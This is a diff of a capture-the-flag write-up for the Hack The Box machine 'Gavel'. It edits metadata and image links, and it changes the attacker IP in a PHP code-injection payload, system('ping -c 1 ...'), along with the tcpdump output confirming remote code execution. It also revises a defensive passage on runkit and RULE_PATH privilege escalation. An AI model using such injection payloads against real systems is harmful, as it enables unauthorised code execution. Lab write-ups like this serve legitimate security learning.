@@ -1,8 +1,11 @@
 ---
 title: "HTB - Gavel"
 date: 2026-03-16
-description: "Medium Linux machine featuring .git source disclosure, a novel PDO SQLi null-byte/backslash bypass, bcrypt cracking, RCE via PHP runkit_function_add, and root through an unchecked RULE_PATH environment variable passed to a privileged daemon."
+description: "Medium Linux box: .git source disclosure, a novel PDO SQLi bypass sqlmap cannot find, runkit RCE, and root through an unchecked RULE_PATH variable."
 tags: ["htb", "linux", "medium", "sqli", "php", "runkit", "git-dumper", "pdo", "privesc"]
+difficulty: "Medium"
+os: "Linux"
+summary: "Linux box: PDO SQLi bypass sqlmap cannot find, then RULE_PATH injection."
 tools: ["rustscan", "ffuf", "git-dumper", "hashcat"]
 ---
 
@@ -10,22 +13,22 @@ Gavel is a Medium-difficulty Linux machine built around a fantasy auction platfo
 
 {{< htb-box-info
   name="Gavel"
-  avatar="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2e446c813e2fa67622764672b9df57bb.png"
+  avatar="/images/htb/machines/gavel.png"
   os="Linux"
   difficulty="Medium"
   release="29 Nov 2025"
   retire="14 Mar 2026"
   user_blood="r34w0k3n"
   user_blood_url="https://app.hackthebox.com/users/2302404"
-  user_blood_img="https://account.hackthebox.com/storage/users/1895157f-acec-4711-a78d-e749c39e8f2f-avatar.png"
+  user_blood_img="/images/htb/avatars/r34w0k3n.png"
   user_blood_time="00:55:28"
   root_blood="NLTE"
   root_blood_url="https://app.hackthebox.com/users/260094"
-  root_blood_img="https://account.hackthebox.com/storage/users/5106f57b-8e24-4238-b682-0bf5f1a7baec-avatar.png"
+  root_blood_img="/images/htb/avatars/nlte.png"
   root_blood_time="01:41:31"
   creator="Shadow21A"
   creator_url="https://app.hackthebox.com/users/1317214"
-  creator_img="https://account.hackthebox.com/storage/users/6456e3d5-2f2e-4b6f-96be-47be657907c6-avatar.png"
+  creator_img="/images/htb/avatars/shadow21a.png"
 >}}
 
 ---
@@ -419,7 +422,7 @@ sudo tcpdump -ni tun0 icmp
 Set the rule to:
 
 ```php
-system('ping -c 1 10.10.14.60'); return true;
+system('ping -c 1 10.10.14.26'); return true;
 ```
 
 Then navigate to the bidding page and place a bid higher than the current price. The bid triggers `bid_handler.php`, which runs the rule. On the listener:
@@ -427,8 +430,8 @@ Then navigate to the bidding page and place a bid higher than the current price.
 ```
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
-23:11:57.577739 IP 10.129.15.156 > 10.10.14.60: ICMP echo request, id 2, seq 1, length 64
-23:11:57.577763 IP 10.10.14.60 > 10.129.15.156: ICMP echo reply, id 2, seq 1, length 64
+23:11:57.577739 IP 10.129.15.156 > 10.10.14.26: ICMP echo request, id 2, seq 1, length 64
+23:11:57.577763 IP 10.10.14.26 > 10.129.15.156: ICMP echo reply, id 2, seq 1, length 64
 ```
 
 RCE confirmed. Now swap the rule for a reverse shell.
@@ -682,4 +685,4 @@ This is why `/dev/shm` works as the staging directory. It is a `tmpfs` mount in 
 
 **runkit_function_add as code execution**: Storing PHP code in a database and executing it at runtime is a pattern that should never appear in production. The `rule` field is conceptually a business logic expression, but it is implemented as arbitrary PHP with no sandboxing at the application layer. Even a proper expression sandbox (like Symfony's ExpressionLanguage component) would be dramatically safer. The minimal fix is strict server-side validation before storage: parse and check the rule against a whitelist of allowed constructs before writing to the `auctions` table.
 
-**Environment variable injection into privileged daemons**: The `RULE_PATH` bug demonstrates a class of privilege escalation that is easy to overlook. The daemon correctly sandboxes PHP execution with a restrictive ini. But then it trusts the caller — an unprivileged user — to supply the path to that ini via an environment variable. A privileged service should never derive security-critical configuration from caller-supplied input. The ini path should be hardcoded or read from a root-controlled configuration file that the calling user cannot influence. Any data that arrives from an unprivileged caller, including environment variables, should be treated as untrusted.
+**Environment variable injection into privileged daemons**: The `RULE_PATH` bug demonstrates a class of privilege escalation that is easy to overlook. The daemon correctly sandboxes PHP execution with a restrictive ini. But then it trusts the caller, an unprivileged user, to supply the path to that ini via an environment variable. A privileged service should never derive security-critical configuration from caller-supplied input. The ini path should be hardcoded or read from a root-controlled configuration file that the calling user cannot influence. Any data that arrives from an unprivileged caller, including environment variables, should be treated as untrusted. [Conversor](/docs/htb/conversor/) escalates through the same class of bug, poisoning `PYTHONPATH` into a root process.
